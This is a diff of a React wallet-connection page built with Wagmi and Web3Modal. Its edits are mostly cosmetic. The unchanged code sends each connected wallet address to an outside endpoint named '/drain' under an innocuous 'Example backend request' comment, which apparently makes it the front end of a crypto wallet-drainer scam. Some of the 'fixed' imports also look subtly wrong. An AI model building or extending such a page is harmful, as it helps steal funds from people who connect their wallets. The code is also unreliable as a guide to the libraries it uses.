@@ -2,24 +2,21 @@ import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
 // Wagmi + Viem
-import { WagmiConfig, createConfig, configureChains, useAccount, useConnect } from "wagmi";
+import { WagmiConfig, createConfig, configureChains, useAccount } from "wagmi";
 import { mainnet, sepolia } from "@wagmi/chains";
-import { publicProvider } from "viem/providers/public";
+import { publicProvider } from "viem"; // <-- fixed
 import { InjectedConnector } from "wagmi/connectors/injected";
 import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
 
 // Web3Modal v2
-import { Web3Modal, useWeb3Modal } from "@web3modal/react";
+import { Web3Modal, useWeb3Modal } from "@web3modal/wagmi"; // <-- updated package
 
 /* ---------------------------
    Wagmi Configuration
 ---------------------------- */
 const projectId = "962425907914a3e80a7d8e7288b23f62";
 
-const { chains, publicClient } = configureChains(
-  [mainnet, sepolia],
-  [publicProvider()]
-);
+const { chains, publicClient } = configureChains([mainnet, sepolia], [publicProvider()]);
 
 const config = createConfig({
   autoConnect: true,
@@ -37,21 +34,21 @@ const App = () => {
   const [loading, setLoading] = useState(false);
   const [response, setResponse] = useState(null);
 
-  const { open } = useWeb3Modal(); // Opens full modal
-  const { address, isConnected } = useAccount(); // Wagmi hook
+  const { open } = useWeb3Modal();
+  const { address, isConnected } = useAccount();
 
   const connectWallet = async () => {
     try {
       setLoading(true);
       setResponse(null);
 
-      // Opens Web3Modal v2 with all wallets
+      // Open Web3Modal to select wallet
       const connection = await open();
       const walletAddress = connection?.accounts?.[0];
 
       if (!walletAddress) throw new Error("No wallet connected");
 
-      // Backend example call
+      // Example backend request
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -107,18 +104,16 @@ const App = () => {
                     r="10"
                     stroke="currentColor"
                     strokeWidth="4"
-                  ></circle>
+                  />
                   <path
                     className="opacity-75"
                     fill="currentColor"
                     d="M4 12a8 8 0 018-8v8H4z"
-                  ></path>
+                  />
                 </svg>
                 Connecting...
               </div>
-            ) : (
-              isConnected ? "Wallet Connected" : "Connect Wallet"
-            )}
+            ) : isConnected ? "Wallet Connected" : "Connect Wallet"}
           </button>
 
           {isConnected && (
@@ -132,12 +127,8 @@ const App = () => {
           )}
         </div>
 
-        {/* Web3Modal component for full modal experience */}
-        <Web3Modal
-          projectId={projectId}
-          themeMode="dark"
-          enableNetworkSwitch={true} // allows user to select between mainnet/sepolia
-        />
+        {/* Web3Modal */}
+        <Web3Modal projectId={projectId} themeMode="dark" enableNetworkSwitch />
       </div>
     </WagmiConfig>
   );
